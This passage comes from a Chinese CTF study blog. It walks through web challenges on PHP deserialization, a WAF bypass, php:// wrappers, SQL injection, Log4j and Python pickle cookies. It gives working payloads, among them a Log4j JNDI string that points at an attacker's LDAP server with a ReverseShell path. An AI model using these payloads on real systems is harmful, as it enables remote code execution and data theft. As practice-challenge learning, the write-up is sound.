class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后在index.php中有一段php代码，第一次看没看到…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后就阔以大致推测，get传过去的select经反序列化变成的res会被传到class.php中作为$this</p><p>做法: 要调用__destruct函数才能显示flag，幸运的是php一般会主动调用这个函数，8需要我们调用<br>然后password要弱等于100，username要等于’admin’，这就有问题了，因为在反序列化时会调用__wake函数，而__wake函数会把username改了</p><p>所以就需要绕过这个函数，怎么绕呢? 可以通过改变属性数绕过，原理是: 当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行</p><p>所以我们构造payload: O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}<br>注意: 此处的%00是空字符，原因是$password和$username都是私有变量，因此在序列化时就会是这种格式</p><h2 id="easy-calc-php字符串解析特性绕过WAF，附解析替换作业"><a href="#easy-calc-php字符串解析特性绕过WAF，附解析替换作业" class="headerlink" title="easy calc (php字符串解析特性绕过WAF，附解析替换作业)"></a>easy calc (php字符串解析特性绕过WAF，附解析替换作业)</h2><p>这题考察waf绕过和php字符串解析特性绕过</p><p>随便输入个’1+!’，返回: “&gt;You don’t have permission to access &#x2F;calc.php on this server.”<br>于是就没去访问calc.php，但其实是我误解了，没法访问是因为输入了字母，而如果提交的参数合法的话是阔以访问的…</p><p>然后偷瞄wp，回来访问calc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//执行 &#x27;echo $str;&#x27;语句</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>黑名单限制，有戏<br>此处只限制了空格等字符，没有限制字符串，但输入字符串却会返回警告(且警告内容8一样)，说明有waf</p><p>waf限制只能提交数字，字母会被过滤，但是阔以用php字符串解析特性绕过waf</p><h3 id="php字符串解析特性"><a href="#php字符串解析特性" class="headerlink" title="php字符串解析特性"></a>php字符串解析特性</h3><p>php在解析时，需要将所有参数转化为有效变量名，为此它要做2件事: 1、把所有空白字符删除；2、把一些字符转化为下划线(包括空格)<br>为此就阔以提交”&#x2F;? num&#x3D;payload”，此时提交的参数是’ num’，删除空格变为num，就阔以绕过防火墙了<br>然后我试了试，发现失败…原因是要把空格换成%20，然后就提交成功了</p><p>然后构造payload，通过scandir()+var_dump()函数查看目录<br>scandir(pram): 列出参数目录下的所有文件\目录(eg:pram&#x3D;’&#x2F;image&#x2F;‘)</p><p>但是calc.php限制了’&#x2F;‘，怎么办?<br>可见你白学了，这个阔以用chr(47)绕过aaaaaaaaaaaah</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-number">47</span>))</span><br></code></pre></td></tr></table></figure><p>回显: Array<br>查看Array目录</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-number">47</span>)))</span><br></code></pre></td></tr></table></figure><p>发现f1agg文件，查看</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">var_dump</span><span class="hljs-params">(file_get_contents(chr(<span class="hljs-number">47</span>)</span></span><span class="hljs-selector-class">.chr</span>(<span class="hljs-number">102</span>)<span class="hljs-selector-class">.chr</span>(<span class="hljs-number">108</span>)<span class="hljs-selector-class">.chr</span>(<span class="hljs-number">97</span>)<span class="hljs-selector-class">.chr</span>(<span class="hljs-number">97</span>)<span class="hljs-selector-class">.chr</span>(<span class="hljs-number">103</span>)<span class="hljs-selector-class">.chr</span>(<span class="hljs-number">47</span>)))  <span class="hljs-comment">//注意是&#x27;/f1aag而8是f1aag&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="解析替换作业"><a href="#解析替换作业" class="headerlink" title="解析替换作业"></a>解析替换作业</h3><p><img src="/images/%E5%88%B7%E9%A2%98/%E8%A7%A3%E6%9E%90%E6%9B%BF%E6%8D%A2.png"></p><h2 id="ZJCTF-2019-NiZhuanSiWei-php伪协议"><a href="#ZJCTF-2019-NiZhuanSiWei-php伪协议" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei (php伪协议)"></a>[ZJCTF 2019]NiZhuanSiWei (php伪协议)</h2><p>进入页面，源码贴脸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看完了，就是php反序列化，决定8看wp自己做出来<br>另外面试的时候可没有让你查资料的机会，所以该记的payload还是有意识记一下</p><p>注释里的useless.php是阔以访问的，但是是空白页面，看来得想办法通过反序列化看源码<br>然后….file正则匹配绕8过去…于是就去看wp了…..(完美打破立的flag)</p><p>首先，会访问text文件并读取里面字符串，这就要用到伪协议: data:&#x2F;&#x2F;写入协议了:<br>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf<br>然后是file，绕8过，但是你有想到甚么吗? 文件包含漏洞啊！次奥，这都想8到<br>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p><p>然后得到base64编码的流，解码获得useless.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <span class="hljs-comment">//读取+显示$this-&gt;file</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>嗯….我觉得到这步真的阔以靠自己做了，起码先试着分析:<br>toString: 可以通过调用它来执行查看file，它在当一个对象被当作字符串使用时被调用<br>unserialize: 调用__wakeup,，没源码，略过</p><p>所以怎么通过反序列化实现对__tostring的调用? 还是说有别的方法?<br>哦，在echo $password时就会调用tostring….你个憨货</p><p>对象是什么? 是Flag, 构造:<br>password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>结果发现你想多了….最后这么构造:<br>text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}<br>然后查看源码即可看到flag….</p><p>还是不熟练啊啊啊啊啊啊啊啊啊啊啊♂啊啊啊啊!!!!</p><h2 id="网鼎杯-2020-青龙组-AreUSerialze-php版本不同可能导致反序列化的结果也不同"><a href="#网鼎杯-2020-青龙组-AreUSerialze-php版本不同可能导致反序列化的结果也不同" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialze (php版本不同可能导致反序列化的结果也不同)"></a>[网鼎杯 2020 青龙组]AreUSerialze (php版本不同可能导致反序列化的结果也不同)</h2><p>很水的一道题，没必要写wp，记录下做题遇到的问题</p><p>在构造payload时遇到了php版本8适应的问题，导致构造好的payload回显老是失败，为此实际操作时记得试试8同的php版本(不同php版本在序列化含private||protected的类时得到的结果可能8一样)</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xdu抗疫CTF</title>
    <link href="/2022/01/09/xdu%E6%8A%97%E7%96%ABCTF/"/>
    <url>/2022/01/09/xdu%E6%8A%97%E7%96%ABCTF/</url>
    
    <content type="html"><![CDATA[<p>挺有收获的比赛，本fw被kill7imer师傅带飞，也让俺看到自己和大佬之间的巨大差距</p><p>分个人赛(萌新赛)和队伍赛，挑里面8会的题记录学习一下</p><p>未全写完，挖坑。。。。。</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="打飞机"><a href="#打飞机" class="headerlink" title="打飞机"></a>打飞机</h2><p>一个页面游戏，要达到5000分才能看flag，无法抓包，所以推测应该是控制台输入，但是没学过js，只能胡乱试，后来发现在f12控制台输入score&#x3D;1000000000, 就阔以获取flag了</p><h2 id="让我访问"><a href="#让我访问" class="headerlink" title="让我访问"></a>让我访问</h2><p>进去后是段php源码，要求请求方式是”HS”，然而搜索请求头相关知识，请求方式有6种包括GET、POST等，’HS’显然是出题人捏出来的，当时8知道怎么改，就8会<br>后来看师傅wp，原来是这么改，请求头的第一行就是请求方式<br><img src="/images/%E6%8A%97%E7%96%ABctf/web(1).png"></p><h2 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h2><p>就是前段时间闹得很火的漏洞，然鹅没做出，看师傅题解</p><h3 id="log4j漏洞"><a href="#log4j漏洞" class="headerlink" title="log4j漏洞"></a>log4j漏洞</h3><p>先扫盲，dns是将你输入的域名翻译成ip地址的东西，那么dnslog就是用来记录用户对域名访问信息的文件，可以在<a href="http://dnslog.cn/">dnslog.cn</a> (dns日志记录平台)查询某个域名的访问记录<br>payload:<br>    ${jndi:ldap:&#x2F;&#x2F;xxxxxx}</p><p>log4j这个漏洞捏，就是只要这个log4j这个组件存在于日志里面(含有payload), 就阔以触发，于是就胡乱塞就阔以了</p><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><p>先访问<a href="http://dnslog.cn/">dnslog.cn</a>, 点Get SubDomain获取1个随记域名，然后它会返回这个域名的查询信息, 然后将域名插入payload, (eg:${jndi:ldap:&#x2F;&#x2F;mfhdpe.dnslog.cn), 然后就….到处塞(这也是官方预期解)</p><p>此题中，下载附件可以看到在application.properties文件中，logging.level.root&#x3D;error, 也就是…要触发访问错误服务器才会将这次访问记录在dnslog, 所以我们在网址后加个&#x2F;123(访问1个叫123的并不存在的文件)，结果自然是404</p><p>再经过尝试，将headers里的ACCEPT所默认的东东改成payload，发送，访问错误，被记录在日志中，然后回到<a href="http://dnslog.cn/">dnslog.cn</a>,刷新日志查询，会发现多了1次请求查询</p><p>然后在1个有公网ip的服务器启动恶意LDAP服务，然后将服务器的ip插入payload,${jndi:ldap:&#x2F;&#x2F;xx.xxx.xx&#x2F;Basic&#x2F;ReverseShell&#x2F;xx.xx(和前面一样的网址)}, 这部分没学过，先挖个坑<br>仍按照之前方式将含payload的headers发送</p><p>然后LDAP恶意服务会加载1个恶意的类到本地去执行(然而java某个版本后这个方法就8能用了，它会把从远程加载这个选项默认关闭)</p><p>填…………….坑</p><hr><h2 id="组队赛login"><a href="#组队赛login" class="headerlink" title="组队赛login"></a>组队赛login</h2><p>这道题让俺被梁佬暴击</p><p>一进去是个登录页面，然后过滤单引号、但不过滤双引号，因此应该是单引号注入<br>过滤空格，可以用url码绕过<br>然后一边开burp爆破一边构造payload, 然后半路上这题居然被爆出来了。。。</p><p>所以有时候爆破这方法也能有效</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>先猜测原sql语句为<br>    select * from uers where uesername&#x3D;’admin’ and password&#x3D;”$password”<br>然后构造$password&#x3D;’”&#x3D;”‘闭合，于是原Sql语句就变成了<br>    select * from users where username&#x3D;’admin’ and password&#x3D;””&#x3D;””</p><p>此处用到sql语言的1个特性<br>password&#x3D;””的值为0，而””的值也为0，所以结果也就是0&#x3D;0，也就是1，就绕过了……</p><h3 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h3><p>然后成功进入后根据提示进入另一个php页面，php源码如下，根据hint需要用到php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);   <span class="hljs-comment">//flag.php!!!!!!!!!</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replace</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span>=<span class="hljs-string">&quot;/flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&quot;nono!&quot;</span>,<span class="hljs-variable">$payload</span>); <span class="hljs-comment">//匹配payload中的filter并替换，此处的/i表示大小写不敏感，(在菜鸟在线里验证过，单双引号的区别</span><br>&#125;;<br><span class="hljs-variable">$sss</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ky&#x27;</span>];  <span class="hljs-comment">//单引号，不转义, 此处为用户输入的可构造payload部分</span><br><span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss1&#x27;</span>]=<span class="hljs-string">&#x27;webwebweb&#x27;</span>;<br><span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss2&#x27;</span>]=<span class="hljs-string">&#x27;pwnpwnpwn&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$sss</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$sss</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)&gt;=<span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//返回flag在php中第一次出现位置的数字 若没有则返回FALSE，所以必须出现上述</span><br>        <span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss1&#x27;</span>]=<span class="hljs-variable">$sss</span>;  <span class="hljs-comment">//ss1换成payload</span><br>        <span class="hljs-variable">$ctf</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>)));<span class="hljs-comment">//serialize:序列化一个对象或数组，返回字符串；调用replace，把&quot;/flag/i&quot;换成nono!，可以双写绕过</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss2&#x27;</span>]===<span class="hljs-string">&quot;webwebweb&quot;</span>)&#123;   <span class="hljs-comment">//3个=，强比较，没法绕</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在花了1下午学习php反序列化漏洞原理，第二天上网查，各种姿势构不出来</p><p>然后俺抱着试一试的态度去问reverse大师梁佬，把俺学习的文章甩给他</p><p>然后kill7imer佬，在不会php没学过Sql注入的情况下，花了20min就构出来了，让我感觉智商被按在地上摩擦</p><p>payload:<br>    flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag”;s:4:”sss2”;s:9:”webwebweb”;}</p><p>利用的是php反序列化底层语法漏洞，后来知道叫做反序列化逃逸，在unserialize函数把1个字符串反序列完后，不管后面是什么都8影响</p><h2 id="L-inc"><a href="#L-inc" class="headerlink" title="L-inc"></a>L-inc</h2><p>这道题2021的miniL-ctf上出过，当时也是8会，现在重学一下</p><p>为此要学习Python序列化</p><p>进入页面，被提示要成为vip才能访问，于是抓包，发现能改的也就cookie了</p><p>cookie一看是base64，放进网站解码一下<br><img src="/images/web(2).png"></p><p>发现解了但没完全解，中间的一堆’…’8知道是什么，而且把它们换成普通的.之后base编码的内容也变了，当时就卡这里了。<br>后来才发现，这个解码网站会自动把无法显示的字符替换为’.’，于是要用Python的base64模块解码才行</p><h3 id="学习Python的序列化与反序列化"><a href="#学习Python的序列化与反序列化" class="headerlink" title="学习Python的序列化与反序列化"></a>学习Python的序列化与反序列化</h3><p>和一般的反序列化类似，网上都能学，此处说说遇到的问题</p><p>遇到的问题就是一开始写脚本，如下，将cookie进行base64解码，得到一串二进制字符，然后用pickle.load()进行解析，发现解析失败…..</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle,base64<br>cookie=<span class="hljs-string">&#x27;gASVLAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjANjeXOUjAN2aXCUiXViLg==&#x27;</span><br>a=base64.b64decode(cookie)<br><span class="hljs-built_in">print</span>(a)<br>b=pickle.loads(a)<br>b.vip=<span class="hljs-literal">True</span><br>b.name=<span class="hljs-string">&#x27;7bmk&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\desktop\python代码\cookie.txt&#x27;</span>,wb) <span class="hljs-keyword">as</span> f:<br>    r=pickle.dump(b,f)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\desktop\python代码\cookie.txt&#x27;</span>,rb) <span class="hljs-keyword">as</span> f:<br>    exp=f.read()<br>    b=base64.b64encode(exp).decode()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64,pickle<br><span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> M<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n,a</span>):<br>        self.name=n<br>        self.age=a<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Print</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.name+<span class="hljs-string">&#x27;_i5_&#x27;</span>+self.age)<br><br>Jack=Person(<span class="hljs-string">&#x27;Jack&#x27;</span>,<span class="hljs-number">18</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\desktop\python代码\cookie1.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    pickle.dump(Jack,f)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\desktop\python代码\cookie1.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    txt=f.read()<br><span class="hljs-built_in">print</span>(txt)<br></code></pre></td></tr></table></figure><p>有2个办法，1是用python的1个模块叫pickletools；2是尝试手动把序列化后的字符翻译回去</p><p>先试试法2，如上述代码，在定义了Person类并初始化对象Jack后，将Jack序列化，再打印序列化结果，如下:</p><pre><code class="hljs">b&#39;\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x04Jack\x94\x8c\x03age\x94K\x12ub.&#39;</code></pre><p>再看看原cookie经过解码后的字符:</p><pre><code 